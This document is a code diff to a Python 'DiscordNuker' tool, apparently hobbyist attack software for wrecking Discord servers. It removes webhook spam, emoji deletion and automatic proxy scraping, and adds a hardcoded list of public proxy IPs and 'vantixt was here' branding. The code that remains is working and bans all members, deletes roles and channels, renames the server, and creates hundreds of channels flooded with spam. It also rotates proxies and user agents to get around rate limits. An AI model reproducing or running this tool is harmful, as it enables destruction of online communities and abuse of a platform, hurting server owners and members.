@@ -31,14 +31,13 @@ class DiscordNuker:
         self.token = ""
         self.target_guild_id = None
         self.ban_message = "banned by vantixt"
-        self.new_name = "NUKE IN PROGRESS"
+        self.new_name = "vantixt was here"
         self.image_path = ""
         self.spam_message = ""
-        self.channel_name_prefix = "nuke"
-        self.channel_count = 500
-        self.message_spam_amount = 20
+        self.channel_name_prefix = "vantixt was here"
+        self.channel_count = 300
+        self.message_spam_amount = 10
         self.leave_after_nuke = True
-        self.webhook_spam = True
         self.rate_limit_delay = 0.1
         self.max_concurrent_tasks = 50
         self.use_proxies = True
@@ -47,7 +46,6 @@ class DiscordNuker:
         self.current_proxy = None
         self.bot = None
         self.session = None
-        self.webhook_sessions = []
         self.user_agents = [
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
@@ -59,57 +57,7 @@ class DiscordNuker:
     def clear(self):
         os.system('cls' if os.name == 'nt' else 'clear')
 
-    async def fetch_proxies(self):
-        try:
-            print(Fore.YELLOW + "[!] Fetching fresh proxies...")
-            proxy_sources = [
-                "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
-                "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
-                "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
-                "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
-                "https://raw.githubusercontent.com/roosterkid/openproxylist/main/http.txt",
-                "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
-                "https://raw.githubusercontent.com/HyperBeats/proxy-list/main/http.txt",
-                "https://raw.githubusercontent.com/ProxyScraper/ProxyScraper/main/http.txt",
-                "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/http.txt",
-                "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/http.txt",
-                "https://raw.githubusercontent.com/ProxySurf/ProxySurf/main/http.txt",
-                "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/http.txt",
-                "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
-                "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
-                "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
-                "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
-                "https://raw.githubusercontent.com/HyperBeats/proxy-list/main/socks4.txt",
-                "https://raw.githubusercontent.com/ProxyScraper/ProxyScraper/main/socks4.txt",
-                "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS4.txt",
-                "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks4.txt",
-                "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/socks4.txt",
-                "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/socks4.txt"
-            ]
-            for url in proxy_sources:
-                try:
-                    async with aiohttp.ClientSession() as session:
-                        async with session.get(url, timeout=10) as response:
-                            if response.status == 200:
-                                text = await response.text()
-                                proxies = [line.strip() for line in text.split('\n') if line.strip()]
-                                self.proxy_list.extend(proxies)
-                                print(Fore.GREEN + f"[+] Fetched {len(proxies)} proxies from {url}")
-                except Exception as e:
-                    print(Fore.RED + f"[-] Error fetching proxies from {url}: {e}")
-                    continue
-            self.proxy_list = list(set(self.proxy_list))
-            random.shuffle(self.proxy_list)
-            self.proxy_cycle = cycle(self.proxy_list)
-            print(Fore.GREEN + f"[+] Total unique proxies: {len(self.proxy_list)}")
-        except Exception as e:
-            print(Fore.RED + f"[-] Proxy fetch failed: {e}")
-
     def get_random_proxy(self):
-        if not self.proxy_list or len(self.proxy_list) < 100:
-            asyncio.create_task(self.fetch_proxies())
-        if self.proxy_cycle is None and self.proxy_list:
-            self.proxy_cycle = cycle(self.proxy_list)
         if self.proxy_cycle:
             proxy = next(self.proxy_cycle)
             self.current_proxy = f"http://{proxy}"
@@ -160,26 +108,88 @@ class DiscordNuker:
             self.message_spam_amount = int(self.message_spam_amount)
         confirm = input("Do you want the bot to leave after nuking? (yes/no, default: yes): ").strip().lower()
         self.leave_after_nuke = confirm != 'no'
-        confirm = input("Do you want to use webhook spam? (yes/no, default: yes): ").strip().lower()
-        self.webhook_spam = confirm != 'no'
         confirm = input("Do you want to use proxies? (yes/no, default: yes): ").strip().lower()
         self.use_proxies = confirm != 'no'
-
-    async def create_webhook_session(self):
-        headers = {
-            "User-Agent": self.get_random_user_agent(),
-            "Authorization": f"Bot {self.token}"
-        }
-        proxy = self.get_random_proxy() if self.use_proxies else None
-        connector = aiohttp.TCPConnector(limit=0, force_close=True, enable_cleanup_closed=True)
-        timeout = aiohttp.ClientTimeout(total=30, connect=10)
-        session = aiohttp.ClientSession(
-            connector=connector,
-            headers=headers,
-            timeout=timeout
-        )
-        self.webhook_sessions.append(session)
-        return session
+        if self.use_proxies:
+            print(Fore.YELLOW + "enter your proxies(double enter when ure done)")
+            proxies = [
+                "66.29.156.102:8080",
+    "199.188.204.195:8080",
+    "47.252.29.28:11222",
+    "72.10.160.90:1237",
+    "38.60.91.60:80",
+    "20.27.15.111:8561",
+    "213.142.156.97:80",
+    "193.31.117.184:80",
+    "45.143.99.15:80",
+    "38.54.71.67:80",
+    "20.78.118.91:8561",
+    "159.203.61.169:3128",
+    "209.97.150.167:8080",
+    "15.168.235.57:10061",
+    "123.30.154.171:7777",
+    "133.18.234.13:80",
+    "32.223.6.94:80",
+    "128.199.202.122:8080",
+    "46.47.197.210:3128",
+    "190.58.248.86:80",
+    "50.122.86.118:80",
+    "200.174.198.158:8888",
+    "35.197.89.213:80",
+    "188.40.57.101:80",
+    "192.73.244.36:80",
+    "4.156.78.45:80",
+    "158.255.77.166:80",
+    "23.247.136.254:80",
+    "152.53.107.230:80",
+    "81.169.213.169:8888",
+    "213.157.6.50:80",
+    "201.148.32.162:80",
+    "213.33.126.130:80",
+    "194.158.203.14:80",
+    "189.202.188.149:80",
+    "181.174.164.221:80",
+    "194.219.134.234:80",
+    "176.65.132.67:3128",
+    "4.245.123.244:80",
+    "154.118.231.30:80",
+    "62.171.159.232:8888",
+    "4.195.16.140:80",
+    "124.108.6.20:8085",
+    "108.141.130.146:80",
+    "134.209.29.120:80",
+    "103.133.26.45:8080",
+    "54.226.156.148:20201",
+    "52.188.28.218:3128",
+    "90.162.35.34:80",
+    "62.99.138.162:80",
+    "103.249.120.207:80",
+    "51.254.78.223:80",
+    "178.124.197.141:8080",
+    "162.238.123.152:8888",
+    "89.58.55.33:80",
+    "213.143.113.82:80",
+    "80.74.54.148:3128",
+    "197.221.234.253:80",
+    "89.58.57.45:80",
+    "91.103.120.49:443"
+            ]
+            while True:
+                proxy = input("Enter proxy: ").strip()
+                if not proxy:
+                    break
+                if ':' in proxy:
+                    proxies.append(proxy)
+                else:
+                    print(Fore.RED + "[-] Invalid format, skipping.")
+            if proxies:
+                self.proxy_list = list(set(proxies))
+                random.shuffle(self.proxy_list)
+                self.proxy_cycle = cycle(self.proxy_list)
+                print(Fore.GREEN + f"[+] Loaded {len(self.proxy_list)} unique proxies.")
+            else:
+                print(Fore.RED + "[-] No valid proxies entered. Disabling proxies.")
+                self.use_proxies = False
 
     async def ban_members(self, guild):
         banned_count = 0
@@ -335,46 +345,6 @@ class DiscordNuker:
         print(Fore.YELLOW + f"\n[!] ROLE DELETION COMPLETED! DELETED: {deleted_count} [!]")
         return deleted_count
 
-    async def delete_emojis(self, guild):
-        deleted_count = 0
-        print(Fore.YELLOW + f"\n[!] DELETING EMOJIS IN {guild.name} [!]")
-        semaphore = asyncio.Semaphore(self.max_concurrent_tasks)
-
-        async def delete_single_emoji(e):
-            nonlocal deleted_count
-            async with semaphore:
-                try:
-                    await e.delete(reason="Nuked")
-                    print(Fore.GREEN + f"[+] DELETED: {e.name} ({e.id})")
-                    deleted_count += 1
-                except discord.Forbidden:
-                    print(Fore.RED + f"[-] FAILED (NO PERMISSION): {e.name} ({e.id})")
-                except discord.HTTPException as e:
-                    if e.status == 429:
-                        retry_after = float(e.headers.get("Retry-After", self.rate_limit_delay))
-                        print(Fore.RED + f"[-] RATE LIMITED (EMOJI DELETE): {e.name} ({e.id}) - Retrying in {retry_after:.2f}s")
-                        await asyncio.sleep(retry_after)
-                        try:
-                            await e.delete(reason="Nuked")
-                            print(Fore.GREEN + f"[+] DELETED (RETRY SUCCESS): {e.name} ({e.id})")
-                            deleted_count += 1
-                        except Exception as retry_e:
-                            print(Fore.RED + f"[-] FAILED ON RETRY (EMOJI DELETE): {e.name} ({e.id}) - {retry_e}")
-                    else:
-                        print(Fore.RED + f"[-] ERROR DELETING EMOJI: {e.name} ({e.id}) - {e}")
-                except Exception as e:
-                    print(Fore.RED + f"[-] Error deleting emoji: {e.name} ({e.id}) - {e}")
-                finally:
-                    await asyncio.sleep(self.rate_limit_delay)
-
-        emojis = list(guild.emojis)
-        random.shuffle(emojis)
-        tasks = [delete_single_emoji(emoji) for emoji in emojis]
-        await asyncio.gather(*tasks)
-
-        print(Fore.YELLOW + f"\n[!] EMOJI DELETION COMPLETED! DELETED: {deleted_count} [!]")
-        return deleted_count
-
     async def change_guild_properties(self, guild):
         print(Fore.YELLOW + f"\n[!] CHANGING SERVER PROPERTIES OF {guild.name} [!]")
 
@@ -435,79 +405,14 @@ class DiscordNuker:
 
         creation_semaphore = asyncio.Semaphore(self.max_concurrent_tasks // 2)
         channels_to_spam = []
-        webhook_sessions = []
 
-        async def create_channel_and_webhook():
+        async def create_channel():
             async with creation_semaphore:
                 try:
                     channel = await guild.create_text_channel(f"{self.channel_name_prefix}-{random.randint(1000, 99999)}")
                     print(Fore.GREEN + f"[+] Created channel: {channel.name}")
+                    channels_to_spam.append({"channel": channel})
                     await asyncio.sleep(self.rate_limit_delay)
-
-                    if self.webhook_spam:
-                        try:
-                            webhook = await channel.create_webhook(name="NUKED")
-                            print(Fore.GREEN + f"[+] Created webhook in {channel.name}")
-
-                            webhook_session = await self.create_webhook_session()
-                            webhook_sessions.append(webhook_session)
-
-                            channels_to_spam.append({
-                                "channel": channel,
-                                "webhook_url": webhook.url,
-                                "session": webhook_session
-                            })
-                        except discord.Forbidden:
-                            print(Fore.RED + f"[-] FAILED (NO PERMISSION TO CREATE WEBHOOK): {channel.name}")
-                            channels_to_spam.append({
-                                "channel": channel,
-                                "webhook_url": None,
-                                "session": None
-                            })
-                        except discord.HTTPException as e:
-                            if e.status == 429:
-                                retry_after = float(e.headers.get("Retry-After", self.rate_limit_delay))
-                                print(Fore.RED + f"[-] RATE LIMITED (WEBHOOK CREATE): {channel.name} - Retrying in {retry_after:.2f}s")
-                                await asyncio.sleep(retry_after)
-                                try:
-                                    webhook = await channel.create_webhook(name="NUKED")
-                                    print(Fore.GREEN + f"[+] Created webhook (RETRY SUCCESS) in {channel.name}")
-
-                                    webhook_session = await self.create_webhook_session()
-                                    webhook_sessions.append(webhook_session)
-
-                                    channels_to_spam.append({
-                                        "channel": channel,
-                                        "webhook_url": webhook.url,
-                                        "session": webhook_session
-                                    })
-                                except Exception as retry_e:
-                                    print(Fore.RED + f"[-] FAILED ON RETRY (WEBHOOK CREATE): {channel.name} - {retry_e}")
-                                    channels_to_spam.append({
-                                        "channel": channel,
-                                        "webhook_url": None,
-                                        "session": None
-                                    })
-                            else:
-                                print(Fore.RED + f"[-] HTTP Exception during webhook creation: {e}")
-                                channels_to_spam.append({
-                                    "channel": channel,
-                                    "webhook_url": None,
-                                    "session": None
-                                })
-                        except Exception as e:
-                            print(Fore.RED + f"[-] Error during webhook creation: {e}")
-                            channels_to_spam.append({
-                                "channel": channel,
-                                "webhook_url": None,
-                                "session": None
-                            })
-                    else:
-                        channels_to_spam.append({
-                            "channel": channel,
-                            "webhook_url": None,
-                            "session": None
-                        })
                 except discord.Forbidden:
                     print(Fore.RED + f"[-] FAILED (NO PERMISSION TO CREATE CHANNEL)")
                 except discord.HTTPException as e:
@@ -518,33 +423,8 @@ class DiscordNuker:
                         try:
                             channel = await guild.create_text_channel(f"{self.channel_name_prefix}-{random.randint(1000, 99999)}")
                             print(Fore.GREEN + f"[+] Created channel (RETRY SUCCESS): {channel.name}")
+                            channels_to_spam.append({"channel": channel})
                             await asyncio.sleep(self.rate_limit_delay)
-                            if self.webhook_spam:
-                                try:
-                                    webhook = await channel.create_webhook(name="NUKED")
-                                    print(Fore.GREEN + f"[+] Created webhook in {channel.name}")
-
-                                    webhook_session = await self.create_webhook_session()
-                                    webhook_sessions.append(webhook_session)
-
-                                    channels_to_spam.append({
-                                        "channel": channel,
-                                        "webhook_url": webhook.url,
-                                        "session": webhook_session
-                                    })
-                                except Exception as webhook_e:
-                                    print(Fore.RED + f"[-] FAILED WEBHOOK CREATION AFTER CHANNEL RETRY: {channel.name} - {webhook_e}")
-                                    channels_to_spam.append({
-                                        "channel": channel,
-                                        "webhook_url": None,
-                                        "session": None
-                                    })
-                            else:
-                                channels_to_spam.append({
-                                    "channel": channel,
-                                    "webhook_url": None,
-                                    "session": None
-                                })
                         except Exception as retry_e:
                             print(Fore.RED + f"[-] FAILED ON RETRY (CHANNEL CREATE): {retry_e}")
                     else:
@@ -554,7 +434,7 @@ class DiscordNuker:
 
         batch_size = 50
         for i in range(0, self.channel_count, batch_size):
-            batch_tasks = [create_channel_and_webhook() for _ in range(min(batch_size, self.channel_count - i))]
+            batch_tasks = [create_channel() for _ in range(min(batch_size, self.channel_count - i))]
             await asyncio.gather(*batch_tasks)
             await asyncio.sleep(1)
 
@@ -562,24 +442,11 @@ class DiscordNuker:
 
         async def spam_in_channel(channel_info):
             channel = channel_info["channel"]
-            webhook_url = channel_info["webhook_url"]
-            webhook_session = channel_info["session"]
-
             async with spam_semaphore:
                 for _ in range(self.message_spam_amount):
                     try:
-                        if webhook_url and self.webhook_spam and webhook_session:
-                            try:
-                                webhook = discord.Webhook.from_url(webhook_url, session=webhook_session)
-                                await webhook.send(self.get_random_message(), username="NUKED")
-                                print(Fore.GREEN + f"[+] Webhook spam in {channel.name}")
-                            except Exception as webhook_e:
-                                print(Fore.YELLOW + f"[!] Webhook failed, falling back to regular message: {webhook_e}")
-                                await channel.send(self.get_random_message())
-                                print(Fore.GREEN + f"[+] Fallback message spam in {channel.name}")
-                        else:
-                            await channel.send(self.get_random_message())
-                            print(Fore.GREEN + f"[+] Message spam in {channel.name}")
+                        await channel.send(self.get_random_message())
+                        print(Fore.GREEN + f"[+] Message spam in {channel.name}")
                     except discord.Forbidden:
                         print(Fore.RED + f"[-] FAILED (NO PERMISSION TO SEND MESSAGE): {channel.name}")
                     except discord.HTTPException as e:
@@ -588,13 +455,8 @@ class DiscordNuker:
                             print(Fore.RED + f"[-] RATE LIMITED (SPAM): {channel.name} - Retrying in {retry_after:.2f}s")
                             await asyncio.sleep(retry_after)
                             try:
-                                if webhook_url and self.webhook_spam and webhook_session:
-                                    webhook = discord.Webhook.from_url(webhook_url, session=webhook_session)
-                                    await webhook.send(self.get_random_message(), username="NUKED")
-                                    print(Fore.GREEN + f"[+] Webhook spam (RETRY SUCCESS) in {channel.name}")
-                                else:
-                                    await channel.send(self.get_random_message())
-                                    print(Fore.GREEN + f"[+] Message spam (RETRY SUCCESS) in {channel.name}")
+                                await channel.send(self.get_random_message())
+                                print(Fore.GREEN + f"[+] Message spam (RETRY SUCCESS) in {channel.name}")
                             except Exception as retry_e:
                                 print(Fore.RED + f"[-] FAILED ON RETRY (SPAM): {channel.name} - {retry_e}")
                         else:
@@ -628,16 +490,17 @@ class DiscordNuker:
             print(Fore.RED + "[-] BOT DOES NOT HAVE ADMINISTRATOR PERMISSIONS!")
             return False
 
-        tasks = [
+        
+        other_tasks = [
             self.ban_members(guild),
-            self.delete_emojis(guild),
             self.delete_roles(guild),
-            self.delete_channels(guild),
-            self.change_guild_properties(guild),
-            self.create_and_spam_channels(guild)
+            self.change_guild_properties(guild)
         ]
+        await asyncio.gather(*other_tasks)
 
-        await asyncio.gather(*tasks)
+        
+        await self.delete_channels(guild)
+        await self.create_and_spam_channels(guild)
 
         if self.leave_after_nuke:
             await self.leave_guild(guild)
@@ -651,18 +514,11 @@ class DiscordNuker:
             await self.session.close()
             self.session = None
 
-        for session in self.webhook_sessions:
-            if not session.closed:
-                await session.close()
-        self.webhook_sessions = []
-
     def run_bot(self):
         intents = discord.Intents.default()
         intents.members = True
         intents.message_content = True
         intents.guilds = True
-        intents.emojis_and_stickers = True
-        intents.webhooks = True
 
         self.bot = commands.Bot(command_prefix="!", intents=intents)
 
@@ -700,9 +556,6 @@ class DiscordNuker:
                 if confirm == 'yes':
                     connector = aiohttp.TCPConnector(limit=self.max_concurrent_tasks, force_close=True)
                     self.session = aiohttp.ClientSession(connector=connector)
-
-                    if self.use_proxies:
-                        asyncio.create_task(self.fetch_proxies())
 
                     await self.nuke_guild(target_guild)
                     await self._close_all_sessions()
